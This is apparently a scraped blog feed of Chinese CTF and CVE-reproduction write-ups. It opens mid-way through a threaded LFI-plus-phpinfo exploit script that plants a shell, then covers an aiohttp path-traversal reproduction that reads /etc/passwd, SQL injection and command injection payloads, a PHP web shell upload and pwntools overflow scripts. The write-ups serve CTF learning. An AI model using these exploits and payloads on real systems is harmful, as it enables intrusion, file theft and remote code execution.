len(body) # 組建 HTTP Request TMPrequest = f\u0026#34;\u0026#34;\u0026#34;POST /phpinfo.php?a=test.txt HTTP/1.1 Host: {host}:{port} Content-Length: {content_length} Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfHfyAsoxPPUAHIAj Connection: keep-alive Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding} Cache-Control: {padding} Accept-Language: {padding} Upgrade-Insecure-Requests: {padding} User-Agent: {padding} Accept: {padding} {body}\u0026#34;\u0026#34;\u0026#34; LFIrequest = \u0026#34;\u0026#34;\u0026#34; GET /lfi.php?file=%s HTTP/1.1 Host: 192.168.56.1:8000 User-Agent: Mozilla/4.0 Proxy-Connection: Keep-Alive \u0026#34;\u0026#34;\u0026#34; return(TMPrequest , TAG , LFIrequest) #找出tmp的偏移 def offset(request,host,port): client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client_socket.connect((host, port)) client_socket.send(request.encode(\u0026#39;utf-8\u0026#39;)) response = b\u0026#34;\u0026#34; while True: chunk = client_socket.recv(4096) if not chunk: break response += chunk client_socket.close() i = response.find(b\u0026#34;[tmp_name] =\u0026amp;gt\u0026#34;) if i == -1: raise ValueError (\u0026#34;no tmp file\u0026#34;) print (\u0026#34;find tmp in %s\u0026#34;,i) tmp_name = response[i:i+100] start = tmp_name.find(b\u0026#39;\u0026amp;gt;\u0026#39;) +5 +i end = tmp_name.find(b\u0026#39;.tmp\u0026#39;) +4 +i i += 255 print(end-start) return(start,end) def LFI(LFIrequest,request,start,end,host,port,TAG): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2.connect((host, port)) s.send(request.encode(\u0026#39;utf-8\u0026#39;)) d = \u0026#34;\u0026#34; while (len(d)\u0026lt;end): d += s.recv(end).decode(\u0026#39;utf-8\u0026#39;) fn = d[start:end] s2.send((LFIrequest % str(fn)).encode(\u0026#39;utf-8\u0026#39;)) response = s2.recv(4096) response = s2.recv(4096) s.close() s2.close() if response.decode(\u0026#39;utf-8\u0026#39;).find(TAG) !=-1: return fn counter = 0 class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter \u0026gt;= self.maxattempts: return counter += 1 try: x = LFI(*self.args) if self.event.is_set(): break if x: print(\u0026#34;\\nGot it! Shell created in /tmp/g\u0026#34;) self.event.set() except socket.error: return def main(): host = \u0026#39;127.0.0.1\u0026#39; port = 80 TMPrequest , tag , LFIrequest =setup(host,port) start , end = offset(TMPrequest,host,port) # LFI(LFIrequest, TMPrequest, start, end, host, port, tag) maxattempts = 1000 poolsz = 20 e = threading.Event() l = threading.Lock() tp = [] for i in range(0, poolsz): tp.append(ThreadWorker(e, l, maxattempts, LFIrequest, TMPrequest, start, end, host, port, tag)) # def LFI(LFIrequest,request,start,end,host,port,TAG): for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: print(\u0026#34;\\r% 4d / % 4d\u0026#34; % (counter, maxattempts)) if counter \u0026gt;= maxattempts: break print() if e.is_set(): print(\u0026#34;Woot!\u0026#34;) else: print(\u0026#34;:(\u0026#34;) except KeyboardInterrupt: print(\u0026#34;\\nTelling threads to shutdown...\u0026#34;) e.set() if __name__ == \u0026#34;__main__\u0026#34;: main() 參考資料 #\rLFI WITH PHPINFO() ASSISTANCE\ngitee twfb/LFI-With-PHPInfo-Assitance\ngithub roughiz/lfito_rce\n","date":"30 December 2024","externalUrl":null,"permalink":"/posts/012_lfiphpinfo/","section":"Posts","summary":"透過phpinfo能夠查看暫存檔資訊，並以此來得到剛剛輸入的惡意payload","title":"phpinfo，打開 LFI 的潘朵拉盒 (Error)","type":"posts"},{"content":"","date":"9 December 2024","externalUrl":null,"permalink":"/tags/cve/","section":"Tags","summary":"","title":"CVE","type":"tags"},{"content":"\r甚麼時候才有自己的CVE\u0026hellip;\n沒相關圖片 嘿嘿封面可以隨邊丟\r前言 #\r這是自己第一次去嘗試分析以及復現一個CVE的內容，由於是第一次去研究CVE，\n因此在一開始要尋找哪個CVE來研究就思考了很久。\n最後是決定是研究有關LFI的漏洞，因為我認為這個漏洞對我來講也比較直觀，\n而且以前在打CTF也有遇過這種漏洞的問題。\n本次CVE復現我也有丟在自己的github上，也歡迎大家去跟著自己實際動手做看看。\nBetan423/CVE-2024-23334-PoC\rThis repository is a proof of concept (POC) for CVE-2024-23334, demonstrating an attempt to replicate the bug in aiohttp that leads to Local File Inclusion (LFI).\rnull 0\r0\r漏洞 #\r漏洞介紹 #\r本漏洞發生在python的aiohttp版本=\u0026lt; 3.9.1、其中的follow_symlinks。\n在撰寫aiohttp的python檔案建立伺服器時，其中有一項為follow_symlinks，能夠設定是否允許符號鏈接，\n若在設定時將此設定為True，由於不會進一步驗證存取位置是否位於該系統目錄中，因此便有Local File Inclusion(LFI)的漏洞產生，能夠透過不斷輸入../來存取到系統根目錄下以外的敏感檔案(例如/etc/passwd之類的)。\n符號連結介紹 #\r簡單介紹一下符號連接，畢竟一開始我也不知道這是什麼\n符號鏈接（symbolic links，也稱為軟連結），簡單來講可以把他想成Windows系統中的捷徑(就是你桌面上一堆點兩下就能開啟該應用程式的東東)。\n我們能夠透過ln -s 目標檔案位置 連結名稱來建立軟連結；而若是不加-s則可以建立硬連結。\n兩者最大的差別為，軟連接只能在當前目錄下生效，若是將其移到其他資料夾中則會失效，\n而硬連結則是不論移到哪都能成功生效。\n所以如果我們這邊建立12個硬連結的話 就會有12生效\n建立軟連結 #\r我們可以透過在static資料夾中執行ln -s ~/Desktop/flag.txt flag來在該資料夾中建立一個軟連結指向桌面的flag.txt，\n接著透過python server.py來執行架設起來的server，並且在網址後面新增/static/flag，\n即可順利查看到桌面的flag.txt內容。 而我們若是將server.py中follow_symlinks改成Flase，\n再次連接http://localhost:8081/static/flag則會變成404: Not Found。\n復現 #\r本次復現主要是照著\r參考github1 來做的\n最初是先按照\r參考github2 來復現，但由於在最後的時候無法順利成功，\n因此最後改成使用其他的，至於為甚麼無法順利LFI則會在下面來做分析。\n復現實做 #\r本次復現基本上只需要按照github中所提供的指令輸入即可順利達成，\n主要是透過python server.py，將服務架設在localhost 8081，並且將follow_symlinks設定為True即可完成環境架設。 接著執行bash exploit.sh，透過不斷新增../的數量，來尋找想LFI的目標(/etc/passwd)，\n再來透過curl --path-as-is $url$payload$file來對比回傳的狀態值是否為200，\n若為200則代表順利找到該檔案，若為其它結果則是新增繼續../的數量來嘗試尋找。\n因此我們也能透過自己在cmd中執行執行例如curl --path-as-is http://localhost:8081/static/../../../../../../etc/passwd，來直接手動輸入取得敏感檔案的內容，\n而curl後面接的--path-as-is主要是為了讓他不會去自動忽略掉../的內容，而是把../作為整個網站內容一起輸入\n而我們也能夠在本地中隨機放一個flag.txt的檔案，並且將exploit.sh中的內容稍作修改，這樣也能順利取得該flag.txt的內容！這樣一題CTF的題目就出好了 參考github2失敗原因? #\r對比兩個github中腳本的不同，\n可以發現在github1中是透過使用curl來獲取網站的回傳狀態碼，\n而github2中則是透過python中的requests.get。\n對比兩者結果後可以發現透過curl都能正常存取到目標檔案，而requests則會有問題。 經過了解後，推測是因為在requests會直接先對內容有../的路徑進行處理，\n進而導致傳輸的請求非預期。\n因此這邊我們只需將../轉換成..%2F，即可順利執行。 總結 #\r現在aiohttp的最新版本為3.11.10，經過實測後，在目前最新版本已經有將本問題修復掉了，\n如果透過調用一樣的腳本，將無法再實現LFI的漏洞。 耶這是自己第一次復現CVE，本來在復現以前覺得CVE都是些神仙級別漏洞，那種腳本都要跑一大長串之類的漏洞。\n但自己在實際操作過後發現，其實腳本也滿簡單的，觀念也都沒有到太高深。\n最困難的部分主要還是在第一個去發現這個漏洞的人，\n所以能第一個找到漏洞的人還是一樣是神🛐\n參考連結 #\rCVE連結\n參考github1\n參考github2\n官方文件\n","date":"9 December 2024","externalUrl":null,"permalink":"/posts/011_cve-2024-23334/","section":"Posts","summary":"本來是臺灣好厲駭課前作業 想說滿酷的就丟上來了","title":"CVE-2024-23334復現","type":"posts"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"\r前言 #\r本次排名 50/287 解出好多題題 解出 #\rCrypto / AES? #\r解密網址: https://www.devglan.com/online-tools/aes-encryption-decryption\nflag: 忘記記ㄌ\nCrypto / Secret ROT13 #\r把+ offset改成- offset就可以了\ndef encrypt(text, key): encrypted_text = \u0026#34;\u0026#34; for i, char in enumerate(text): offset = ((i + 1 + key) * (i + 1)) % 26 if \u0026#39;A\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;Z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) + offset) % 26 + ord(\u0026#39;A\u0026#39;)) elif \u0026#39;a\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;a\u0026#39;) + offset) % 26 + ord(\u0026#39;a\u0026#39;)) else: new_char = char encrypted_text += new_char return encrypted_text # 測試範例 key = 7 plaintext = \u0026#34;NHNC{Y0[_kT0w_H0]_tU_decXypZe}\u0026#34; ciphertext = encrypt(plaintext, key) print(\u0026#34;加密後的密文:\u0026#34;, ciphertext) ans = \u0026#34;VZRU{Y0k_yd0w_Z0o_ti_rsslyxli}\u0026#34; def decrypt(text, key): encrypted_text = \u0026#34;\u0026#34; for i, char in enumerate(text): offset = ((i + 1 + key) * (i + 1)) % 26 if \u0026#39;A\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;Z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) - offset) %26 + ord(\u0026#39;A\u0026#39;)) elif \u0026#39;a\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;a\u0026#39;) - offset) %26 + ord(\u0026#39;a\u0026#39;)) else: new_char = char encrypted_text += new_char return encrypted_text ciphertext = decrypt(ans, key) print(\u0026#34;解密後的密文:\u0026#34;, ciphertext) flag: NHNC{Y0u_kn0w_H0w_to_decrypte}\nCrypto / Ande Yo Caliente #\r透過ChaCha20加密，其實我根本不會解\n但餵給GPT後他就直接幫我生出exp.py\n請勿模仿 最壞示範 點我看對話紀錄\nfrom binascii import unhexlify # Provided data iv = unhexlify(\u0026#34;635b52504ab86d67d780dede\u0026#34;) encrypted_message = unhexlify(\u0026#34;eab3ee7a3821847b76558eb61ec26f4fc7f72f436966ab7680d652b872c85c0bae4879db0748b02dde7df7ca34288a0fa21bd8889c57d3ff986a9566f09733cfbc6e\u0026#34;) encrypted_flag = unhexlify(\u0026#34;f393c557632f836f226c828c1e87634489fa2e7d7b38e477b0d14dfa66\u0026#34;) # Known plaintext message = b\u0026#34;When you feel my heat, look into my eyes\\nIt\u0026#39;s where my demons hide\u0026#34; # Recover the keystream keystream = bytes([m ^ e for m, e in zip(message, encrypted_message)]) # Decrypt the flag flag = bytes([f ^ k for f, k in zip(encrypted_flag, keystream)]) print(f\u0026#34;Recovered FLAG: {flag.decode()}\u0026#34;) flag: NHNC{what_i_learned_from_htb}\nMisc / Where is this #\rgoogle找排骨酥麵跟河堤上的貓\nflag: NHNC{24.803_120.979}\nMisc / Blog2 #\r點到推薦vt那邊的留言，可以看到管理員的留言，點進去後可以看到個人檔案\n裡面有個不要點進來 所以我們點進去就有flag了 flag: NHNC{comments_disqusjs}\nWeb / 哥布林保衞部公告 #\rF12打開就能看到被註釋掉的flag了\n也能右鍵點開 檢視網頁原始碼 查看\nflag: NHNC{BeCareful!}\nWeb / EASY METHOD #\r透過標題還有點進去都有特別提及HTTP Method，就是GET、POST那些的\n使用burp suite攔截封包然後送到repeater，開始改HTTP Method\n找了一下發現有OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT這幾種\n最後改成PUT就有flag了\n也能用curl來改啦 但我不會 ㄏ\nflag: NHNC{Y0u_kn0w_H0w_t0_us3_CURL}\nWeb / I need to get the C00kies #\rF12把自己的cookie值改成admin\nflag: NHNC{You_Kn0w_H0w_t0_chang3_th3_c00ki3}\nWeb / Login #\rSQLI\nUsername填admin' OR 1=1 ;--\nPassword隨便寫就可以了 因為上面已經將後續都註釋掉了\nflag: NHNC{S1mp|e_-_SQL!}\nWeb / 1 line php #\r透過%0A能夠在bash中換行，於是後面就可以開始command injection了 接著發動通靈能力，cd 到根目錄(/)看到 flag- ，接著輸出該檔案就可以ㄌ\npayload: cmd=%0Acd%20/%20;cat%20flag-\nflag: NHNC{enter_is_always_the_best}\nReverse / easyyyyyyyyyy #\r不知道為甚麼我直接執行會失敗\n但總之把他丟到ida後就會發現有個function叫flag(void)\n點進去就有了\nflag: NHNC{this_is_a_easy_one}\nReverse / Guess the num #\r一開始直接透過ida去把猜數字最後比較的部分從jnz改成jz\n結果發現最後輸出的flag是假的qq\n實際去查看了一下每個function後，發現其中sub_1217很可疑，有調用到flag，看起來疑似是在作解密之類的?\n接著透過gdb直接跳到該function，由於這題的base address不是常見的0x400000，因此這邊要先下vmmap來看一下base address\n查看後發現是0x0000555555554000，那再來就先在目標function下一個bp然後跳到那邊ni逐步執行就可以了\nb *(0x0000555555554000+0x1217)\rjump *(0x0000555555554000+0x1217) flag: NHNC{traced_down_to_dtor}\nPwn / Grading system #\r觀察原代碼可以發現這題存在陣列溢出問題\n其實我也不知道是不是叫這個名子 好像不是 但隨便\n總之由於他沒有限制我們對於陣列查找的範圍\n因此我們能透過輸入超出陣列大小的值，來leak出其他值\n然後這題還很貼心的把admin初始化為1234，而且還提供了快速dump陣列值的功能\n我們剛開始學生數量任意輸入，接著透過Dump功能來查找1234的值位於陣列何處\n最後再透過修改該值為1，即可透過輸入S來getshell\nflag: NHNC{i_dont_think_you_are_a_teacher}\nForensics / MagicButton #\r下載下來後點按鈕就會噴flag了\nflag: NHNC{This_is_real_vuln}\nForensics / Kohiro #\r圖片很明顯是被裁切過，因此這邊要來改變圖片的高度\n透過hex編輯器(我是用010editor)找到其中控制寬高的部分\n可以透過先將當前圖片的長度/高度轉成hex的形式，再拿去裡面搜尋相同的值\n搜尋後可以發現是在其中的00A0,3~6為高、寬的長度\n這邊把高的長度加長一點就有flag了\n矮額\nflag: NHNC{you_can_edit_hex_00A0_04}\nForensics / Suspicious GIF #\r把gif逐禎分解後就有flag了\nconvert sus.gif flag.png flag: NHNC{FrAmE_bY_fRaMe}\nForensics / BotNet1 #\r進去\r查詢網址後，查看Internal Transactions\nflag: NHNC{0x3e9e0e9cee22Ccd0ac94604A72394B0A1CCdb27A}\n未解出 #\rForensics / MagicButton #\rForensics / BotNet2 #\rCrypto / Baby RSA #\rWeb / Miday #\rWeb / Democracy #\rReverse / Here\u0026rsquo;s the sauce #\rReverse / Kid game #\rReverse / Yet Another password checker #\rPWN / DOF #\rPWN / Filtered #\r總結 #\r這次解到滿躁的 感覺很多都差一點 然後有些題目很幹( 耶繼續努力 plus ultra\n","date":"16 November 2024","externalUrl":null,"permalink":"/posts/010_weeklyctf05/","section":"Posts","summary":"這次打的是No Hack No CTF 2024","title":"No Hack No CTF 2024","type":"posts"},{"content":"\r別虐了\u0026hellip;\n算在每周ctf內，之後應該都把名子改成比賽名稱\n共通點應該是都不會有封面\n前言 #\r比賽剛開就把會的題目就秒殺了 直接衝到第三名\n然後再來就開始躺了\n❎ 不會解\n✅ 懶得解\n這次Misc一題都 不會 不敢碰\n本次排名 25/106 解出10題 解出 #\rWelcome / 競賽規則 #\r在ruls的部分最下面有一串base64的東東，丟去解密後就有flag了\nflag: NCKUCTF{我會遵守以上規則因為我是好駭客}\nWelcome / Discord #\r藏在dc 🩸｜迎新盃＆首殺公告 的頻道主題內\n比較機車的點是 基本上要全螢幕才看得到後面的那串描述\nflag: NCKUCTF{Welcome to 2024 NCKUCTF Freshmen Cup!}\nWelcome / 回饋表單 #\r請大家去乖乖填表單 甚至只有27個人解完這題\nflag: NCKUCTF{Thanks for your playing, have a nice day!}\nPwn /[新手友善] Overflow Tutorial #\r考了 integer overflow 還有overwrite data的概念 (應該是叫這個沒錯\n簡單來講就是整數溢出跟複寫\n第二個複寫的部分如果懶得算具體前面要送多少字元的話，可以就直接先無腦噴一堆A，然後再去慢慢縮減就好\npayload: 251\rAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANCKUCTF flag: NCKUCTF{H0p3_U_LeaRNed_Some_concept_Ab0ut_Sof7w4r3_sEcur1tY_N0w_0a05f6c72945fc781e1a0f5b54dc285a}\nPwn / Every pwner\u0026rsquo;s first challenge #\r透過buffer overflow來覆蓋 return address 的值，讓他最後變成是回到 call_me function\n找 win function 的話可以用 gdb 的 info func 或是 IDA 直接打開看都可以\n然後具體前面要先送多少字元才能蓋到 ret address 的話可以透過 pwn tool 的 cyclic ，先多送一大堆值進去，再透過GDB來查看報錯時的 $rsp 內容，最後再透過 cyclic_find(\u0026quot;$rsp的值\u0026quot;) 即可找出要覆蓋多少\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./chal\u0026#34;) if args.GDB: gdb.attach(r, \u0026#39;b *0x401228\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; win = 0x401196 # payload= cyclic(100) payload= cyclic(40) + p64(win) sla(b\u0026#34;Welcome to NCKUCTF Freshmen cup!\\n\u0026#34;, payload) r.interactive() flag: NCKUCTF{Y0ur_Pwn_J0urn3y_S74rts_FrOM_noW!_19999da0cf8e994642f89c8015ca5d05}\nReverse / ✌️✊✋ #\r直接執行就有flag了，本來還以為是題目寫爆了?\nflag: NCKUCTF{w0W_yOU_4re_vErY_gooD_47_ROck_PAPeR_5cS50RS!!}\nReverse / Youtube Video Recommendation Tool #\r直接strings 查看會輸出的全部yt連接，最後發現其中一個的標題就是flag了\nflag: NCKUCTF{w4I7_a_MiNU73_kaITō_kiddOoa4}\nReverse / Baby Python Assembly #\r基本上把兩段code都塞給GPT他就會幫你生出原本的list了\n謝謝GPT拯救所有懶得看不會組語的我\n但最好還是去乖乖看組語啦哈哈\n跟GPT的對話過程\nflag: NCKUCTF{baby_pyth0N_1s_s0_EzZzzzzZZzzzzzZzzzz_Vincent55_is_so_Electric_OrzZzZZ_a8b40af05731c9612abeec69772de8e8ca8be759000d272e89f9ea5d413b2477}\nWeb / 好駭客的網站 #\r簡單來講就是塞web shell，但聽說是題目出爆了才會被簡單繞過\n在上傳圖片的部分先透過 burp suite 攔下發送的封包，送到 repeater 中開始修改\n首先會擋掉附檔名為 .php 的內容，但這部分可以變成送 .Php 來繞過\n再來是內容部分不能直接放shell code，前面要先加一段允許格式的Magic Numbers來繞過，這邊我是用gif的\n再來就到上傳圖片的地方後面的cmd加上想執行的指令就可以了\nhttp://chall.nckuctf.org:29103/uploads/aaaa_test.Php?cmd=塞這邊\npayload: GIF87a \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt; flag: NCKUCTF{YOu_are_a_g00d_H4cK3r_Just_Lik3_Vincent55_V3ry_N1c3_945dae36ca165274}\nCrypto / E? #\r一樣是靠GPT拿到的exp 這邊直接套原話\n你可以使用 中國餘數定理（CRT） 來解這個問題，前提是這些 e1 和 e2 是互質的。\n你有兩個方程式： c1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n如果你知道 c1 和 c2 相等，並且知道 e1 和 e2，那麼你可以利用擴展的歐幾里得算法來求解 m。\n利用擴展的歐幾里得算法來找到 s1 和 s2，使得：\ns1 * e1 + s2 * e2 = 1\n根據這個結果，你可以計算出：\nm ≡ (pow(c1, s1, n) * pow(c2, s2, n)) % n\n這樣就能算出 m 的值。\nimport math # 擴展歐幾里得算法 def extended_gcd(a, b): if b == 0: return a, 1, 0 gcd, x1, y1 = extended_gcd(b, a % b) x = y1 y = x1 - (a // b) * y1 return gcd, x, y # 主要解碼邏輯 def decrypt(c1, c2, e1, e2, n): gcd, s1, s2 = extended_gcd(e1, e2) if gcd != 1: raise ValueError(\u0026#34;e1 和 e2 必須互質\u0026#34;) # 如果 s1 是負數，將其轉換為正數 if s1 \u0026lt; 0: c1 = pow(c1, -s1, n) c1 = pow(c1, -1, n) else: c1 = pow(c1, s1, n) # 如果 s2 是負數，將其轉換為正數 if s2 \u0026lt; 0: c2 = pow(c2, -s2, n) c2 = pow(c2, -1, n) else: c2 = pow(c2, s2, n) # 得到原始的 m m = (c1 * c2) % n return m # 示例 n = 3233 # 一個模數 n m = 42 # 原始消息 e1 = 3 # 第一個公開指數 e2 = 7 # 第二個公開指數 # 加密得到的密文 c c1 = pow(m, e1, n) c2 = pow(m, e2, n) # 用 c1 和 c2 來解密 解密後的_m = decrypt(c1, c2, e1, e2, n) print(f\u0026#34;解密後的消息 m = {解密後的_m}\u0026#34;) 未解出 #\r參考Write Up\nReverse / 2048?? #\r因為不會用dnspy下斷點查看flag的內容，所以最後還是用CE\n透過dnspy查看勝利條件後，可以發現最終目標是要出現數字為2486的方塊，但理論上不可能達成，因此\nCE 啟動!! 慢慢尋找後會發現它儲存的方法是根據每一格位置來存，不是看自己方塊的數字(?)\n例如說左下的格子現在是2，但你把2移走後就會是0\n既然找到內存位置後，再來就只需要把它改成2486就可以了\n// Token: 0x0600001C RID: 28 public bool checkGoal() { for (int i = 0; i \u0026lt; 4; i++) { for (int j = 0; j \u0026lt; 4; j++) { if (this.iBoard[i][j] == this.goal) { return true; } } } return false; } // Token: 0x0400000E RID: 14 private int goal = 2486; flag: NCKUCTF{WHo_I5_RO63R?}\nWeb / Just Image #\r比賽的時候想不到沒有.要怎麼回到根目錄就沒解出來，結果//就可以了qq\n先直接去查看會動的鳥鳥圖片網址，發現最後的格式是base64加密後的，因此我們只需要將目標路徑也base64過後再送過去就好了\nhttp://chall.nckuctf.org:29202/img/Ly9mbGFn 最後再把網站Ctrl+s存下來，在原本的網站讀不出來得原因是因為他不是圖片檔，存成txt之類的就可以了\nflag: NCKUCTF{os.path.join can join to root}\nMisc / Double Exploit #\r很酷的一題，現在才知道原來這些東西都可以撈，喵\n原始碼如下\n\u0026lt;?php require \u0026#34;secret.php\u0026#34;; if (isset($_GET[\u0026#39;payload\u0026#39;])){ $payload=$_GET[\u0026#39;payload\u0026#39;]; if (strlen($payload)\u0026gt;6) die(\u0026#34;Bad bad cat\u0026#34;); $result=shell_exec(\u0026#34;./pwn_me \u0026#34;.$payload); if ($result==\u0026#34;Meowing Whale\u0026#34;){ echo $flag; } } highlight_file(\u0026#34;index.php\u0026#34;); 先查看題目會發現，payload的部分只能輸入6個字元、 最後的result要為\u0026quot;Meowing Whale\u0026quot;\n首先能透過http://chall.nckuctf.org:29205/pwn_me，來下載pwn_me去做分析\n透過IDA查看後會發現，輸入的第二字元為#則會輸出我們要的Meowing\n再來透過存取http://chall.nckuctf.org:29205/Dockerfile，可以發現還可以存取一個叫f的檔案，一樣把它下載下來，發現執行後就會輸出Whale\n東西都找到了，最後就把它們串在一起就可以了 payload=0%23;.%2ff\n不知道為甚麼payload直接送 0#;./f 會失敗，要變成送url編碼後的形式才可以\nflag: NCKUCTF{my_first_pwn+web+rev_XD}\n總結 #\r耶寫完了 排版一樣很醜\n這次好廢喔 明年還打 好打一直打\n","date":"14 October 2024","externalUrl":null,"permalink":"/posts/009_weeklyctf04/","section":"Posts","summary":"這次打的是成大資安社迎新杯","title":"成大資安社迎新杯 CTF","type":"posts"},{"content":"\rplus ultra\r前言 #\r這禮拜比較忙 很多事情擠在一起\n事後檢討比較沒有時間看 所以這禮拜就稍微水一周吧欸嘿\n本次排名 444/1033 解出3題 qq 解出 #\rWarmup / Welcome #\r進dc就看得到ㄌ\nWarmup / Math Gone Wrong #\r簡單來講就是要讓以下成立\nn1*10+n2*10 != (n1+n2)*10\nn1、n2輸入小數點就可以順利通過ㄌ\nWarmup / Introspection #\r題目code\nchar buf[1008]; printf(\u0026#34;\u0026gt;\u0026gt; \u0026#34;); read(0, buf, 1008); 簡單來講就是如果剛好輸入1008個字元，會把最後null byte也蓋掉\n因此輸出的時候就會不知道buf的內容已經結束，會接續把後面flag[]內的內容也噴出來\n總結 #\r最近比較忙 很多事情都擠在這幾周\n所以這次沒什麼看賽後 搜哩 下周一定\n","date":"10 October 2024","externalUrl":null,"permalink":"/posts/008_weeklyctf03/","section":"Posts","summary":"這次打的是iron CTF","title":"每周CTF計畫03","type":"posts"},{"content":"\r迪奧：\njojo，一個人的能力是有極限的 我從短暫的人生中學到一件事\u0026hellip;\u0026hellip;\n越是玩CTF，就越會發現一個人的能力是有極限的\u0026hellip; 除非超越人類。\n喬納森：\n你到底想說什麼？\r前言 #\r這次參加的是 BuckeyeCTF 2024 ，這次在CTFtime找比賽的時候有看到一個有點類似picoCTF gym的網站(?\n裡面也是滿多他舉辦的CTF歷屆題目的 網址點我 有興趣可以去練習\n本次排名 145/648 解出13題 但都滿基本的 題目 #\rbctf #\rrev #\rflagwatch #\r透過\r工具把腳本逆向成回來，透過ASCII解密得到原始碼，看出加密邏輯\na=[62,63,40,58,39,40,111,63,52,50,53,63,104,48,48,37,3,61,3,55,57,37,48,108,59,59,111,46,33] print(len(a)) for i in range(29): print(chr(a[i]^92),end=\u0026#39;\u0026#39;) # flag bctf{t3chnic4lly_a_keyl0gg3r} text #\r使用工具jd-gui-windows-1.6.6\n這題是透過把文字冒險寫成jar然後要逆向\n但透過jd-gui去察看後會發現裡面基本上就是一對if else來控制\n慢慢逆向即可 雖然滿簡單但我覺得滿好玩的\npayload enter pick up torch go right cross the bridge take rope (CrystalRoom) leave leave go center go down go right use the rope pick up sword (AcrossRiver) leave leave leave leave (EntryHall) go left cut pick up key leave leave go center go down left unlock the door reach through the crack in the rocks the crack in the rocks concealing the magical orb with the flag flag: bctf{P33r_1nT0_tH3_j4r_2_f1nd_Th3_S3cR3Ts_d1463580a690f294}\nbeginner-pwn #\rrunway0 #\rarray開100但允許輸入0x100，存在overwrite漏洞，把想執行的東西蓋到command[]的部分即可 \u0026lsquo;a\u0026rsquo;*112+cat flag.txt flag: bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}\nrunway1 #\r透過overflow把win function的address覆蓋到return address，也就是esp的值\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway1\u0026#34;) if args.GDB: gdb.attach(r,\u0026#39;b *(0x804928f)\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; win = 0x80491E6 payload= cyclic(76) + p64(win) sla(\u0026#34;What is your favorite food?\\n\u0026#34;,payload) r.interactive() run2 #\r本來還以為要串ROP哈哈 中間卡很久，結果後面才發現他是x32的檔案然後我都用p64\n導致覆蓋會多補八個0 改成p32就正常==\n一樣是overflow到win func只是這次win func會額外查看兩個if條件式\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, 